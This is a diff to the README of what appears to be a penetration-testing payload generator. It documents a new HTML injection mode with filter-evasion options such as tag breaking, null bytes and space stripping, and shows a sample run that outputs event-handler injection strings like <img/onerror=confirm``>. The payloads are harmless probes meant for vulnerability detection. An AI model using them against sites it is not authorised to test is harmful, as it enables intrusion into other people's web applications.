@@ -3,7 +3,7 @@ Payload Generator Tool. These payloads are only help to detect the vulnerability
 
 - [x] XSS Payload Generation
 - [x] SSTI Payload Generation
-- [ ] HTML Injection Payload Generation
+- [x] HTML Injection Payload Generation
 - [x] Open Redirection Payload Generation
 - [x] SQL Injection Payload Generation
 - [ ] Command Injection Payload Generation
@@ -280,4 +280,44 @@ File & Path Traversal Payload Mutations:
   --urlencode           Set URL Encoding for Payloads
 ```
 
+## HTML Injection
 
+### Help
+
+```bash
+usage: generator.py htmli [-h] [--html-tags] [--html-events] [--combo-list] [--unique-string] [--tag  [...]] [--event  [...]] [--include-id] [--payload  [...]] [--urlencode] [--strip-space] [--tag-breaking] [--null-byte]
+
+options:
+  -h, --help         show this help message and exit
+
+HTML Injection Payload Types:
+  --html-tags        Generate HTML tags
+  --html-events      Generate HTML Events
+  --combo-list       Generate Combo List
+
+HTML Injection Payload Options:
+  --unique-string    Set Unique string for payload genrating
+  --tag  [ ...]      Set Unique TAG for payload genrating
+  --event  [ ...]    Set Unique TAG for payload genrating
+  --include-id       Include ID into payloads
+  --payload  [ ...]  Add Custom Payloads
+
+HTML Injection Payload Mutations:
+  --urlencode        Set URL Encoding for Payloads
+  --strip-space      Change space in Payloads
+  --tag-breaking     Apply Tag Breaking
+  --null-byte        Apply Null Byte Injection
+                                              
+```
+
+### Generate Example Payloads
+
+```bash
+python3 generator.py htmli --strip-space --tag "img" --tag "s" --tag "h1" --combo-list --null-byte --event "onerror" --event "onmouseover" --include-id --payload "confirm\`\`" 
+<img/onmouseover=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
+<h1/onmouseover=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
+<s/onerror=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
+<img/onerror=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
+<h1/onerror=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
+<s/onmouseover=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
+```
